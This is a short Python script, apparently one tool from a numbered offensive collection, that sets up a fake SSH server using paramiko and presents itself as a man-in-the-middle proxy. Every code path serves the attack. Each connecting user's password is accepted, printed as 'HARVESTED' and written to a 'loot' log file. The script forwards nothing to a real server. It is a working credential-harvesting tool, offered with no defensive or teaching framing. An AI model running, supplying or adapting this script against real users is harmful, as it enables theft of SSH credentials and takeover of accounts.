import sys
import socket
import threading
import paramiko
import os

# Generate or load a host key
HOST_KEY = paramiko.RSAKey.generate(2048)

class MitMServer(paramiko.ServerInterface):
    def __init__(self, client_ip):
        self.client_ip = client_ip

    def check_auth_password(self, username, password):
        print(f"\n[!!!] HARVESTED: {username}:{password} from {self.client_ip}")
        with open("../../../loot/ssh_mitm_creds.log", "a") as f:
            f.write(f"{self.client_ip} | {username}:{password}\n")
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED if kind == 'session' else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

def handle_client(client_sock, addr):
    try:
        transport = paramiko.Transport(client_sock)
        transport.add_server_key(HOST_KEY)
        server = MitMServer(addr[0])
        transport.start_server(server=server)
        channel = transport.accept(20)
        while transport.is_active():
            pass
    except Exception:
        pass

def start_proxy(lhost, lport):
    print(f"[*] SSH MitM active on {lhost}:{lport}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((lhost, lport))
    sock.listen(100)
    while True:
        c_sock, addr = sock.accept()
        threading.Thread(target=handle_client, args=(c_sock, addr)).start()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 145_ssh_mitm <host> <port>")
        sys.exit(1)
    start_proxy(sys.argv[1], int(sys.argv[2]))
